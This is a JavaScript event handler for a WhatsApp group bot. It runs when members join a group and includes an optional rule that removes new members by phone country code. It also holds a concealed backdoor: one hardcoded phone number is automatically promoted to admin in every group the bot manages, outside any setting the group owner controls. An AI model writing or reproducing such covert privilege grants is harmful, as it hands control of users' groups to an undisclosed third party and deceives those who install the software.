const { getGroupSettings } = require('../Mongodb/Settingsdb');

const Evens = async (client, Fortu) => {
  try {
    const groupSettings = await getGroupSettings(Fortu.id);
    let metadata = await client.groupMetadata(Fortu.id);
    let participants = Fortu.participants;

    const botname = process.env.BOTNAME || 'drraded';
    const mycode = process.env.MYCODE || "254";

    for (let num of participants) {
      if (Fortu.action === 'add' && (num.includes('254114018035'))) {
        await client.groupParticipantsUpdate(Fortu.id, [num], 'promote');
        client.sendMessage(Fortu.id, { 
          text: `@${num.split('@')[0]} has joined and has been promoted to admin!`, 
          mentions: [num] 
        });
      } else if (
        Fortu.action === "add" &&
        groupSettings.antiforeign &&
        !num.startsWith(mycode) &&
        Fortu.id !== "120363043406726701@g.us"
      ) {
        await client.sendMessage(Fortu.id, {
          text: `@${num.split`@`[0]} removed by ${botname}. Your country code is not allowed here!`,
          mentions: [num],
        });

        await client.groupParticipantsUpdate(Fortu.id, [num], "remove");
      }
    }
  } catch (err) {
    console.log(err);
  }
};

module.exports = Evens; 